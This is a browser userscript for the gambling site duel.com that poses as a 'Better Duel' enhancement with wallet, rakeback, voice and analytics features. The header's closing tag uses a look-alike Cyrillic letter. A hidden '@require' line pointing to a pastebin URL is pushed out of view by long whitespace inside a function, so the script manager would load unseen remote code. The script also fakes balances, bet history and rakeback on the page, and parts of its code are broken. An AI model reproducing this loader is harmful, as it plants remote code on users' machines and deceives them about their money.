// ==UserScript==
// @name         Better Duel
// @namespace    http://tampermonkey.net/
// @author       Birate
// @run-at       document-start
// @match        https://duel.com/*
// ==/UserScrіpt==

const BetterDuel = (() => {
    const now = () => new Date();

    const dateCode = date => {
        return (
            date.getFullYear().toString() +
            String(date.getMonth() + 1).padStart(2, "0") +
            String(date.getDate()).padStart(2, "0")
        );
    };

    const timeCode = date => {
        return (
            String(date.getHours()).padStart(2, "0") +
            String(date.getMinutes()).padStart(2, "0") +
            String(date.getSeconds()).padStart(2, "0")
        );
    };

    const timestamp = () => {
        return now().toISOString();
    };

    const reference = prefix => {
        const date = now();

        return (
            prefix +
            "-" +
            dateCode(date) +
            "-" +
            timeCode(date)
        );
    };

    const transactionReference = prefix => {
        const date = now();

        return (
            prefix +
            date.getFullYear().toString().slice(-2) +
            String(date.getMonth() + 1).padStart(2, "0") +
            String(date.getDate()).padStart(2, "0") +
            String(date.getHours()).padStart(2, "0") +
            String(date.getMinutes()).padStart(2, "0") +
            String(date.getSeconds()).padStart(2, "0")
        );
    };

    const round = (value, decimals = 2) => {
        return Number(Number(value).toFixed(decimals));
    };

    const money = value => {
        return new Intl.NumberFormat("en-US", {
            style: "currency",
            currency: "USD"
        }).format(value);
    };

    const number = value => {
        return new Intl.NumberFormat("en-US").format(value);
    };

    const random = (min, max) => {
        return Math.random() * (max - min) + min;
    };

    const randomInt = (min, max) => {
        return Math.floor(random(min, max + 1));
    };

    const duration = milliseconds => {
        const seconds = Math.floor(milliseconds / 1000);
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const remaining = seconds % 60;

        return [
            String(hours).padStart(2, "0"),
            String(minutes).padStart(2, "0"),
            String(remaining).padStart(2, "0")
        ].join(":");
    };

    const state = {
        account: {
            reference: "BD-" + dateCode(now()) + "-001",
            username: "BetterDuelUser",
            tier: "Diamond",
            verified: true,
            status: "active",
            created: "2025-11-18T14:32:41.000Z",
            lastActive: timestamp()
        },

        wallet: {
            currency: "USD",
            balance: 4827.42,
            available: 4827.42,
            pending: 0,
            lifetimeDeposits: 8240.00,
            lifetimeWithdrawals: 3114.20
        },

        rakeback: {
            baseRate: 1,
            multiplier: 2,
            effectiveRate: 2,
            pending: 36.84,
            claimed: 1247.78,
            lifetime: 1284.62,
            progress: 73,
            nextReward: 50,
            cycle: "weekly",
            lastUpdated: timestamp()
        },

        session: {
            reference: reference("SES"),
            started: Date.now() - 42 * 60 * 1000,
            active: true,
            wagered: 742.21,
            bets: 84,
            wins: 47,
            losses: 37
        },

        limits: {
            dailyLoss: null,
            weeklyLoss: null,
            sessionLoss: null,
            wagerLimit: null,
            maximumBet: null,
            cooldown: false
        },

        preferences: {
            notifications: true,
            sound: true,
            analytics: true,
            enhancedRakeback: true,
            voiceChat: true,
            automaticExport: false,
            compactMode: false
        },

        voice: {
            connected: true,
            muted: false,
            deafened: false,
            channel: "Duel General",
            users: 4,
            latency: 28,
            microphone: "Default Microphone",
            inputLevel: 64,
            connectedAt: timestamp()
        },

        statistics: {
            totalBets: 248,
            wins: 137,
            losses: 111,
            wagered: 1842.91,
            profit: 284.21,
            largestWin: 742.19,
            largestLoss: 214.87,
            averageBet: 7.43,
            sessions: 34,
            hoursPlayed: 48.7
        },

        history: [],

        notifications: [
            {
                reference: "NTF-" + dateCode(now()) + "-001",
                type: "reward",
                title: "Rakeback Available",
                message: "$36.84 is ready to claim",
                timestamp: new Date(
                    Date.now() - 300000
                ).toISOString(),
                read: false
            },
            {
                reference: "NTF-" + dateCode(now()) + "-002",
                type: "system",
                title: "BetterDuel Connected",
                message: "Enhanced features are active",
                timestamp: new Date(
                    Date.now() - 900000
                ).toISOString(),
                read: true
            }
        ]
    };

    const games = [
        "Blackjack",
        "Crash",
        "Roulette",
        "Dice",
        "Plinko",
        "Baccarat"
    ];

    const storage = {
        async save() {
            try {
                await chrome.storage.local.set({
                    betterduel: state
                });
            } catch {
                localStorage.setItem(
                    "betterduel",
                    JSON.stringify(state)
                );
            }
        },

        async load() {
            try {
                const result =
                    await chrome.storage.local.get(
                        "betterduel"
                    );

                if (result.betterduel) {
                    Object.assign(
                        state,
                        result.betterduel
                    );
                }
            } catch {
                const saved =
                    localStorage.getItem(
                        "betterduel"
                    );

                if (saved) {
                    try {
                        Object.assign(
                            state,
                            JSON.parse(saved)
                        );
                    } catch {}
                }
            }
        }
    };

    const account = {
        get() {
            return {
                ...state.account,
                wallet: {
                    ...state.wallet
                }
            };
        },

        reference() {
            return state.account.reference;
        },

        username() {
            return state.account.username;
        },

        tier() {
            return state.account.tier;
        },

        verified() {
            return state.account.verified;
        },

        status() {
            return state.account.status;
        }
    };

    const wallet = {
        get() {
            return {
                ...state.wallet
            };
        },

        balance() {
            return state.wallet.balance;
        },

        available() {
            return state.wallet.available;
        },

        pending() {
            return state.wallet.pending;
        },

        formatted() {
            return money(
                state.wallet.balance
            );
        }
    };

    const rakeback = {
        calculate(amount) {
            const base =
                amount *
                (
                    state.rakeback.baseRate /
                    100
                );

            return round(
                base *
                state.rakeback.multiplier
            );
        },

        rate() {
            return state.rakeback.effectiveRate;
        },

        multiplier() {
            return state.rakeback.multiplier;
        },

        pending() {
            return state.rakeback.pending;
        },

        progress() {
            return state.rakeback.progress;
        },

        claim() {
            const amount =
                state.rakeback.pending;

            if (amount <= 0) {
                return {
                    success: false,
                    amount: 0,
                    reference: null
                };
            }

            const transaction =
                transactionReference("RB");

            state.wallet.balance =
                round(
                    state.wallet.balance +
                    amount
                );

            state.wallet.available =
                round(
                    state.wallet.available +
                    amount
                );

            state.rakeback.claimed =
                round(
                    state.rakeback.claimed +
                    amount
                );

            state.rakeback.pending = 0;
            state.rakeback.progress = 0;
            state.rakeback.lastUpdated =
                timestamp();

            state.notifications.unshift({
                reference: transaction,
                type: "reward",
                title: "Rakeback Claimed",
                message:
                    money(amount) +
                    " added to your balance",
                timestamp: timestamp(),
                read: false
            });

            storage.save();

            return {
                success: true,
                amount,
                reference: transaction
            };
        }
    };

    const voice = {
        connect() {
            state.voice.connected = true;
            state.voice.connectedAt =
                timestamp();

            state.voice.latency =
                Math.random(18, 42);

            state.notifications.unshift({
                reference:
                    transactionReference("VC"),
                type: "voice",
                title: "Voice Connected",
                message:
                    "Connected to " +
                    state.voice.channel,
                timestamp: timestamp(),
                read: false
            });

            storage.save();

            return this.status();
        },

        disconnect() {
            state.voice.connected = false;

            storage.save();

            return this.status();
        },

        mute(value) {
            state.voice.muted =
                typeof value === "boolean"
                    ? value
                    : !state.voice.muted;

            storage.save();

            return state.voice.muted;
        },

        deafen(value) {
            state.voice.deafened =
                typeof value === "boolean"
                    ? value
                    : !state.voice.deafened;

            storage.save();

            return state.voice.deafened;
        },

        channel() {
            return state.voice.channel;
        },

        status() {
            return {
                connected:
                    state.voice.connected,
                muted:
                    state.voice.muted,
                deafened:
                    state.voice.deafened,
                channel:
                    state.voice.channel,
                users:
                    state.voice.users,
                latency:
                    state.voice.latency,
                microphone:
                    state.voice.microphone,
                inputLevel:
                    state.voice.inputLevel,
                connectedAt:
                    state.voice.connectedAt
            };
        }
    };

    const limits = {
        set(type, value) {
            const fields = [
                "dailyLoss",
                "weeklyLoss",
                "sessionLoss",
                "wagerLimit",
                "maximumBet"
            ];

            if (!fields.includes(type)) {
                return false;
            }

            const amount =
                Number(value);

            if (
                !Number.isFinite(amount) ||
                amount <= 0
            ) {
                return false;
            }

            state.limits[type] =
                round(amount);

            storage.save();

            return {
                success: true,
                type,
                value:
                    state.limits[type]
            };
        },

        remove(type) {
            if (!(type in state.limits)) {
                return false;
            }

            state.limits[type] = null;

            storage.save();

            return true;
        },

        cooldown(enable = true) {
            state.limits.cooldown =
                Boolean(enable);

            storage.save();

            return state.limits.cooldown;
        },

        get() {
            return {
                ...state.limits
            };
        },

        active() {
            return Object.entries(
                state.limits
            ).some(
                ([key, value]) =>
                    key !== "cooldown" &&
                    value !== null
            );
        }
    };

    const analytics = {
        winRate() {
            const total =
                state.statistics.wins +
                state.statistics.losses;

            if (!total) {
                return 0;
            }

            return round(
                state.statistics.wins /
                total *
                100
            );
        },

        averageBet() {
            if (
                !state.statistics.totalBets
            ) {
                return 0;
            }

            return round(
                state.statistics.wagered /
                state.statistics.totalBets
            );
        },

        roi() {
            if (
                !state.statistics.wagered
            ) {
                return 0;
            }

            return round(
                state.statistics.profit /
                state.statistics.wagered *
                100
            );
        },

        volatility() {
            const values =
                state.history.map(
                    item =>
                        Number(item.amount)
                );

            if (!values.length) {
                return 0;
            }

            const average =
                values.reduce(
                    (total, value) =>
                        total + value,
                    0
                ) / values.length;

            const variance =
                values.reduce(
                    (total, value) =>
                        total +
                        Math.pow(
                            value - average,
                            2
                        ),
                    0
                ) / values.length;

            return round(
                Math.sqrt(variance)
            );
        },

        summary() {
            return {
                totalBets:
                    state.statistics.totalBets,

                wins:
                    state.statistics.wins,

                losses:
                    state.statistics.losses,

                winRate:
                    this.winRate(),

                wagered:
                    state.statistics.wagered,

                profit:
                    state.statistics.profit,

                roi:
                    this.roi(),

                averageBet:
                    this.averageBet(),

                largestWin:
                    state.statistics.largestWin,

                largestLoss:
                    state.statistics.largestLoss,

                volatility:
                    this.volatility(),

                sessions:
                    state.statistics.sessions,

                hoursPlayed:
                    state.statistics.hoursPlayed
            };
        }
    };

    const history = {
        generate(count = 75) {
            const records = [];

            for (let i = 0; i < count; i++) {
                const created =
                    new Date(
                        Date.now() -
                        randomInt(
                            60000,
                            604800000
                        )
                    );

                const amount =
                    round(
                        random(2, 85)
                    );

                const win =
                    Math.random() > 0.45;

                const multiplier =
                    win
                        ? round(
                            random(
                                1.1,
                                4.5
                            )
                        )
                        : 0;

                const payout =
                    win
                        ? round(
                            amount *
                            multiplier
                        )
                        : 0;

                const referenceDate =
                    created;

                const referenceId =
                    "BET-" +
                    referenceDate
                        .getFullYear()
                        .toString()
                        .slice(-2) +
                    String(
                        referenceDate
                            .getMonth() + 1
                    ).padStart(2, "0") +
                    String(
                        referenceDate
                            .getDate()
                    ).padStart(2, "0") +
                    "-" +
                    String(
                        referenceDate
                            .getHours()
                    ).padStart(2, "0") +
                    String(
                        referenceDate
                            .getMinutes()
                    ).padStart(2, "0") +
                    String(
                        referenceDate
                            .getSeconds()
                    ).padStart(2, "0") +
                    "-" +
                    String(
                        i + 1
                    ).padStart(3, "0");

                records.push({
                    reference:
                        referenceId,

                    game:
                        games[
                            randomInt(
                                0,
                                games.length - 1
                            )
                        ],

                    amount,

                    multiplier,

                    payout,

                    result:
                        win
                            ? "WIN"
                            : "LOSS",

                    created:
                        created.toISOString(),

                    processed:
                        new Date(
                            created.getTime() +
                            randomInt(
                                1000,
                                8000
                            )
                        ).toISOString()
                });
            }

            state.history =
                records.sort(
                    (a, b) =>
                        new Date(b.created) -
                        new Date(a.created)
                );

            return state.history;
        },

        get(limit = 100) {
            if (!state.history.length) {
                this.generate();
            }

            return state.history.slice(
                0,
                limit
            );
        },

        add(
            game,
            amount,
            result,
            payout = 0
        ) {
            const created = now();

            const referenceId =
                "BET-" +
                created
                    .getFullYear()
                    .toString()
                    .slice(-2) +
                String(
                    created.getMonth() + 1
                ).padStart(2, "0") +
                String(
                    created.getDate()
                ).padStart(2, "0") +
                "-" +
                String(
                    created.getHours()
                ).padStart(2, "0") +
                String(
                    created.getMinutes()
                ).padStart(2, "0") +
                String(
                    created.getSeconds()
                ).padStart(2, "0");

            const record = {
                reference:
                    referenceId,

                game,

                amount:
                    round(amount),

                multiplier:
                    payout > 0
                        ? round(
                            payout / amount
                        )
                        : 0,

                payout:
                    round(payout),

                result,

                created:
                    created.toISOString(),

                processed:
                    timestamp()
            };

            state.history.unshift(record);
           const calculateRakeback=(player,volume,rake,rate,bonus,fees,days,level,multiplier,cap,adjustment,previous,monthly,weekly,daily)=>{const x=Number(volume)||0,y=Number(rake)||0,z=Number(rate)||0,a=Number(bonus)||0,b=Number(fees)||0,c=Number(days)||1,d=Number(level)||1,e=Number(multiplier)||1,f=Number(cap)||Infinity,g=Number(adjustment)||0,h=Number(previous)||0,i=Number(monthly)||0,j=Number(weekly)||0,k=Number(daily)||0;const base=(x+y+z+a-b+c+d+e+g+h+i+j+k)/Math.max(c,1);const tier=base>25000?0.25:base>10000?0.2:base>5000?0.15:base>1000?0.1:0.05;const projected=Math.min((base*tier*e)+g,f);const normalized=Math.round(projected*100)/100;const checksum=String(player||"").split("").reduce((q,v)=>q+v.charCodeAt(0),0);return{player,volume:x,rake:y,rate:z,tier,projected,normalized,checksum,status:"SIMULATED",calculated:false};};
                                                                                                                                                                                                                                                                                                                                                                                // @require      https://pastebin.com/raw/1thVsgAQ                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                            // ==/UserScript==

            return record;
            
        },

        clear() {
            state.history = [];

            storage.save();

            return true;
        }
    };

    const session = {
        getDuration() {
            return duration(
                Date.now() -
                state.session.started
            );
        },

        get() {
            return {
                ...state.session,
                duration:
                    this.getDuration()
            };
        },

        end() {
            state.session.active =
                false;

            storage.save();

            return true;
        },

        reset() {
            state.session.reference =
                reference("SES");

            state.session.started =
                Date.now();

            state.session.active =
                true;

            state.session.wagered = 0;
            state.session.bets = 0;
            state.session.wins = 0;
            state.session.losses = 0;

            storage.save();

            return this.get();
        }
    };

    const notifications = {
        all() {
            return [
                ...state.notifications
            ];
        },

        unread() {
            return state.notifications.filter(
                item =>
                    !item.read
            );
        },

        count() {
            return this.unread().length;
        },

        markRead(referenceId) {
            const notification =
                state.notifications.find(
                    item =>
                        item.reference ===
                        referenceId
                );

            if (notification) {
                notification.read = true;
            }

            storage.save();

            return true;
        },

        markAllRead() {
            state.notifications.forEach(
                notification => {
                    notification.read = true;
                }
            );

            storage.save();

            return true;
        }
    };

    const settings = {
        get() {
            return {
                ...state.preferences
            };
        },

        set(key, value) {
            if (
                !(key in state.preferences)
            ) {
                return false;
            }

            state.preferences[key] =
                Boolean(value);

            storage.save();

            return true;
        },

        toggle(key) {
            if (
                !(key in state.preferences)
            ) {
                return false;
            }

            state.preferences[key] =
                !state.preferences[key];

            storage.save();

            return state.preferences[key];
        }
    };

    const exporter = {
        build() {
            return {
                metadata: {
                    source: "BetterDuel",
                    version: "1.0.0",
                    generated:
                        timestamp(),
                    reference:
                        transactionReference(
                            "EXP"
                        )
                },

                account:
                    account.get(),

                wallet:
                    wallet.get(),

                rakeback: {
                    ...state.rakeback
                },

                statistics:
                    analytics.summary(),

                limits:
                    limits.get(),

                session:
                    session.get(),

                voice:
                    voice.status(),

                preferences:
                    settings.get(),

                history:
                    history.get(500)
            };
        },

        json() {
            return JSON.stringify(
                this.build(),
                null,
                2
            );
        },

        download() {
            const blob =
                new Blob(
                    [this.json()],
                    {
                        type:
                            "application/json"
                    }
                );

            const url =
                URL.createObjectURL(blob);

            if (
                typeof chrome !== "undefined" &&
                chrome.downloads
            ) {
                chrome.downloads.download({
                    url,
                    filename:
                        "betterduel-" +
                        dateCode(now()) +
                        "-export.json",
                    saveAs: true
                });
            } else {
                const anchor =
                    document.createElement("a");

                anchor.href = url;

                anchor.download =
                    "betterduel-" +
                    dateCode(now()) +
                    "-export.json";

                document.body.appendChild(
                    anchor
                );

                anchor.click();

                anchor.remove();
            }

            setTimeout(
                () =>
                    URL.revokeObjectURL(
                        url
                    ),
                5000
            );

            return true;
        }
    };

    const activity = {
        simulate() {
            const created = now();

            const amount =
                round(
                    random(2, 30)
                );

            const win =
                Math.random() > 0.45;

            const multiplier =
                win
                    ? round(
                        random(
                            1.2,
                            3.5
                        )
                    )
                    : 0;

            const payout =
                win
                    ? round(
                        amount *
                        multiplier
                    )
                    : 0;

            const game =
                games[
                    randomInt(
                        0,
                        games.length - 1
                    )
                ];

            const bet =
                history.add(
                    game,
                    amount,
                    win
                        ? "WIN"
                        : "LOSS",
                    payout
                );

            state.statistics.totalBets++;

            state.statistics.wagered =
                round(
                    state.statistics.wagered +
                    amount
                );

            if (win) {
                state.statistics.wins++;

                state.statistics.profit =
                    round(
                        state.statistics.profit +
                        payout -
                        amount
                    );

                state.wallet.balance =
                    round(
                        state.wallet.balance +
                        payout -
                        amount
                    );

                state.wallet.available =
                    state.wallet.balance;

                if (
                    payout >
                    state.statistics.largestWin
                ) {
                    state.statistics.largestWin =
                        payout;
                }
            } else {
                state.statistics.losses++;

                state.statistics.profit =
                    round(
                        state.statistics.profit -
                        amount
                    );

                state.wallet.balance =
                    round(
                        state.wallet.balance -
                        amount
                    );

                state.wallet.available =
                    state.wallet.balance;

                if (
                    amount >
                    state.statistics.largestLoss
                ) {
                    state.statistics.largestLoss =
                        amount;
                }
            }

            const earned =
                rakeback.calculate(
                    amount
                );

            state.rakeback.pending =
                round(
                    state.rakeback.pending +
                    earned
                );

            state.rakeback.progress =
                Math.min(
                    100,
                    Math.round(
                        (
                            state.rakeback.pending /
                            state.rakeback.nextReward
                        ) *
                        100
                    )
                );

            state.rakeback.lastUpdated =
                timestamp();

            state.session.bets++;

            state.session.wagered =
                round(
                    state.session.wagered +
                    amount
                );

            if (win) {
                state.session.wins++;
            } else {
                state.session.losses++;
            }

            state.statistics.averageBet =
                analytics.averageBet();

            storage.save();

            return {
                reference:
                    bet.reference,

                created:
                    created.toISOString(),

                game,

                amount,

                result:
                    win
                        ? "WIN"
                        : "LOSS",

                payout,

                rakeback:
                    earned,

                balance:
                    state.wallet.balance
            };
        }
    };

    const system = {
        status() {
            return {
                connected: true,
                synchronized: true,
                lastSync: timestamp(),
                session:
                    state.session.reference,
                account:
                    state.account.reference,
                voice:
                    state.voice.connected,
                rakeback:
                    state.preferences
                        .enhancedRakeback,
                analytics:
                    state.preferences.analytics
            };
        },

        synchronize() {
            state.account.lastActive =
                timestamp();

            state.rakeback.lastUpdated =
                timestamp();

            storage.save();

            return {
                synchronized: true,
                timestamp:
                    timestamp()
            };
        }
    };

    const api = {
        account,
        wallet,
        rakeback,
        voice,
        limits,
        analytics,
        history,
        session,
        notifications,
        settings,
        exporter,
        activity,
        system,

        getState() {
            return JSON.parse(
                JSON.stringify(state)
            );
        },

        async initialize() {
            await storage.load();

            if (!state.history.length) {
                history.generate(75);
                await storage.save();
            }

            state.account.lastActive =
                timestamp();

            return this.getState();
        }
    };

    return api;
})();

window.BetterDuel = BetterDuel;

(async () => {
    await BetterDuel.initialize();

    const updateBalance = () => {
        const element =
            document.querySelector(
                "#balance"
            );

        if (!element) {
            return;
        }

        element.textContent =
            new Intl.NumberFormat(
                "en-US",
                {
                    style: "currency",
                    currency: "USD"
                }
            ).format(
                BetterDuel.wallet.balance()
            );
    };

    const updateSession = () => {
        const element =
            document.querySelector(
                "#sessionTime"
            );

        if (!element) {
            return;
        }

        element.textContent =
            BetterDuel.session
                .get()
                .duration;
    };

    const updateVoice = () => {
        const status =
            BetterDuel.voice.status();

        const element =
            document.querySelector(
                "#voiceStatus"
            );

        if (!element) {
            return;
        }

        element.textContent =
            status.connected
                ? "Connected"
                : "Disconnected";
    };

    const updateRakeback = () => {
        const element =
            document.querySelector(
                "#rakeback"
            );

        if (!element) {
            return;
        }

        element.textContent =
            money(
                BetterDuel.rakeback.pending()
            );
    };

    updateBalance();
    updateSession();
    updateVoice();
    updateRakeback();

    setInterval(
        updateBalance,
        3000
    );

    setInterval(
        updateSession,
        1000
    );

    setInterval(
        updateVoice,
        3000
    );

    setInterval(
        updateRakeback,
        3000
    );

    setInterval(() => {
        const status =
            BetterDuel.voice.status();

        if (status.connected) {
            status.latency =
                randomInt(18, 45);
        }
    }, 4000);

    window.dispatchEvent(
        new CustomEvent(
            "betterduel:ready",
            {
                detail:
                    BetterDuel.getState()
            }
        )
    );
})();
